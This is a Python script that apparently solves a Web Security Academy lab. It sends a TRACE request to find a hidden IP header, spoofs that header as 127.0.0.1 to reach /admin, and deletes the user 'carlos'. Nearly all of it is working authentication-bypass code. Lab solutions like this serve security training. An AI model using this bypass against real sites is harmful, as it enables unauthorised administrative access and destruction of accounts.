from web_security_academy.core.utils import *
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import re


def solve_lab(session):
    # Send TRACE request
    print_info('Sending a TRACE request to "/admin"...')
    resp = session.request("TRACE", urljoin(session.url, "/admin"))
    if resp.status_code != 200:
        print_fail(f"TRACE request came back with an unexpected response.")
    else:
        print_success("TRACE request came back with the following response:\n")
        print(resp.text, end="")

    # Extract custom HTTP header
    query = re.search(
        # Matches header line that contains an IP address
        r"([\S]+): [0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}",
        resp.text,
    )
    if query is None:
        print_fail("Did not find expected HTTP header.")
    else:
        hidden_header = query.group(1)

    # Deleting user "carlos"
    print_info('Visiting "/admin" with the following header:')
    headers = {hidden_header: "127.0.0.1"}
    print(f"{headers}\n")

    resp = session.get_path("/admin", headers=headers)
    if resp.status_code != 200:
        print_fail('Unable to visit "/admin".')

    print_info("Using the response to find path to delete the user carlos...")
    soup = BeautifulSoup(resp.text, "html.parser")
    tag = soup.find(lambda tag: tag.has_attr("href") and "carlos" in tag.get("href"))

    if tag is None:
        print_fail("Unable to find URL.")
    else:
        delete = tag.get("href")
        print_success(f"Found URL: {delete}\n")

    print_info(
        f'Deleting the user carlos by visiting "{delete}" (with custom header)...'
    )
    resp = session.get_path(delete, headers=headers)
